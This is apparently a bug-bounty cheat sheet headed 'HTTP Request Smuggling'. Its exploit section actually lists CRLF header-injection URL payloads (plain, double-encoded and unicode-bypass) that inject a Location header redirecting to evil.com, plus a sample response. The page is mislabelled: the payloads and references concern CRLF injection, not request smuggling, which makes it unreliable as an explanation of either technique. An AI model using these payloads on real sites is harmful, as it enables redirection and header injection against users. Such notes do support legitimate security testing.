# HTTP Request Smuggling

## Introduction
HTTP request smuggling is a technique for interfering with the way a web site processes sequences of HTTP requests that are received from one or more users. Request smuggling vulnerabilities are often critical in nature, allowing an attacker to bypass security controls, gain unauthorized access to sensitive data, and directly compromise other application users.

## Where to find
Request smuggling is primarily associated with HTTP/1 requests.
websites that support HTTP/2 may be vulnerable, depending on their back-end architecture (HTTP/1).

## Impact
bypass security controls
Gain unauthorized access to sensitive data
DoS aplication user with 404

## How to exploit
1. Basic payload
```
https://example.com/?lang=en%0D%0ALocation:%20https://evil.com/
```
The response is
```
HTTP/1.1 200 OK
Content-Type: text/html
Date: Mon, 09 May 2016 14:47:29 GMT
Set-Cookie: language=en
Location: https://evil.com/
```

2. Double encode
```
https://example.com/?lang=en%250D%250ALocation:%20https://evil.com/
```

3. Bypass unicode
```
https://example.com/?lang=en%E5%98%8A%E5%98%8DLocation:%20https://evil.com/
```

## References
* [@filedescriptor](https://blog.innerht.ml/twitter-crlf-injection/)
* [EdOverflow](https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/crlf.md)
